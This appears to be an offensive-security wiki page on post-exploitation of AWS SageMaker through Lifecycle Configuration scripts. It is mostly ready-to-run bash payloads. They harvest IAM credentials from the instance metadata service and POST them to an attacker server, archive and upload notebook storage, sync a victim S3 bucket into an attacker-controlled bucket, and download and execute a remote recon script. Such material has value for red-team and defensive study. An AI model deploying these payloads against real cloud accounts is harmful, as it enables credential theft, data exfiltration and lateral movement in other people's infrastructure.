# **AWS \- SageMaker Post-Exploitation**

## **Post-Exploitation via Lifecycle Configurations (LCCs)**

Once an attacker has permissions to create or modify SageMaker Lifecycle Configurations (e.g., via a persistence mechanism), LCCs can be used to automate a wide range of post-exploitation activities. The script within an LCC executes with the full permissions of the IAM role attached to the SageMaker instance, providing a powerful execution context.

The following techniques demonstrate how to use LCCs to harvest credentials, exfiltrate data, and prepare for lateral movement.

### **Credential Harvesting**

An LCC can be scripted to automatically harvest temporary IAM credentials from the Instance Metadata Service (IMDS) as soon as the instance starts.

* Accessing IMDSv1 & IMDSv2:  
  SageMaker instances, like EC2, provide access to temporary credentials via the IMDS. While IMDSv2 is more secure against SSRF, it does not prevent an LCC script running locally on the instance from acquiring and using credentials.  

* Payload Example (Harvest and Exfiltrate IAM Credentials):  
  This script retrieves credentials for both IMDSv1 and IMDSv2 and exfiltrates them to an attacker-controlled server.
```bash 
  #!/bin/bash

# Attacker server for exfiltration
ATTACKER_SERVER="http://<ATTACKER_IP>:<PORT>"

# --- IMDSv1 ---
ROLE_NAME_V1=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
if [ -n "$ROLE_NAME_V1" ]; then
    CREDS_V1=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME_V1)
    # Exfiltrate credentials
    echo "$CREDS_V1" | curl -X POST -d @- "$ATTACKER_SERVER/creds/v1"
fi

# --- IMDSv2 ---
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
if [ -n "$TOKEN" ]; then
    ROLE_NAME_V2=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
    if [ -n "$ROLE_NAME_V2" ]; then
        CREDS_V2=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME_V2)
        # Exfiltrate credentials
        echo "$CREDS_V2" | curl -X POST -d @- "$ATTACKER_SERVER/creds/v2"
    fi
fi

```
### **Data Exfiltration**

LCCs can automate the theft of sensitive data, such as notebooks, datasets, and model artifacts, from the local instance or from S3 buckets the instance role can access.

* From Local Notebook Storage (/home/ec2-user/SageMaker/):  
  The entire contents of the SageMaker user's home directory can be archived and uploaded. The nohup command is crucial here to ensure the exfiltration process can complete if it takes longer than the 5-minute LCC timeout.  

* **Payload Example (Archive and Exfiltrate Local Data):**  
```bash
 #!/bin/bash

# Attacker server for receiving exfiltrated data
ATTACKER_SERVER="http://<ATTACKER_IP>:<PORT>/uploads"

# Archive file path
EXFIL_ARCHIVE="/tmp/sagemaker_data.tar.gz"
SOURCE_DIR="/home/ec2-user/SageMaker/"

# Use nohup to run the process in the background, bypassing the 5-min timeout
nohup bash -c "
tar -czf $EXFIL_ARCHIVE -C $SOURCE_DIR . 2>/dev/null
if [ -f \"$EXFIL_ARCHIVE\" ]; then
    curl -s -X POST --data-binary @\"$EXFIL_ARCHIVE\" $ATTACKER_SERVER
    rm -f \"$EXFIL_ARCHIVE\"
fi
" &

```
* From S3 Buckets:  
  If the instance's IAM role grants access to S3, an LCC can use the AWS CLI to copy data to an attacker-controlled bucket. This is highly effective as SageMaker roles often have broad S3 permissions.  

* **Payload Example (Sync Data to Attacker's S3 Bucket):**  
```bash
#!/bin/bash

# The S3 path containing sensitive data
VICTIM_S3_PATH="s3://victim-sensitive-data-bucket/project-files/"

# Attacker-controlled S3 bucket for exfiltration
ATTACKER_EXFIL_S3_PATH="s3://attacker-exfil-bucket/stolen-data/sagemaker_$(date +%Y%m%d)/"

# Use nohup for this potentially long-running sync operation
nohup aws s3 sync "$VICTIM_S3_PATH" "$ATTACKER_EXFIL_S3_PATH" --quiet &
```
### **Facilitating Lateral Movement**

An LCC can prepare the compromised SageMaker instance to be a pivot point for further attacks within the AWS environment by deploying additional tooling.

* Deploying Reconnaissance Tools:  
  An LCC can download and execute scripts from an attacker-controlled server to perform internal network discovery or enumerate other AWS services.  

* **Payload Example (Download and Execute a Recon Script):**
```bash
#!/bin/bash

# URL to the attacker's reconnaissance script
RECON_SCRIPT_URL="http://<ATTACKER_IP>/recon.sh"
LOCAL_SCRIPT_PATH="/tmp/recon.sh"

# Download the script
curl -s -o "$LOCAL_SCRIPT_PATH" "$RECON_SCRIPT_URL"

if [ -f "$LOCAL_SCRIPT_PATH" ]; then
    chmod +x "$LOCAL_SCRIPT_PATH"

    # Execute in the background, saving output for later exfiltration
    nohup "$LOCAL_SCRIPT_PATH" > "/tmp/recon_output.txt" 2>&1 &
fi

```
